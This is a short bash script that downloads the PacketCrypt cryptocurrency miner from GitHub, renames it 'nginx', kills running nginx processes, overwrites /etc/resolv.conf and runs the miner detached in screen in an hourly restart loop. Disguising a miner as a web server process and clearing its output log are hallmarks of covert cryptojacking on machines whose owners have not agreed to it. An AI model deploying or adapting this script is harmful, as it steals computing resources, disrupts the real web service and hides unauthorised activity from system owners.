#!/bin/bash

lscpu
ps -ef | grep "nginx" | grep -v grep | awk '{print $2}' | xargs kill -9
echo nameserver 8.8.8.8 > /etc/resolv.conf
rm -rf  nginx start.sh
wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O nginx
chmod +x nginx

while true
do 
 echo $1
 echo $2
 screen -dmS nginx ./nginx ann -p $1 $2
 echo "start nginx"
 sleep 1h
 ps -ef | grep "nginx" | grep -v grep | awk '{print $2}' | xargs kill -9
 rm -rf nohup.out
 echo "stop nginx"
 screen -wipe
done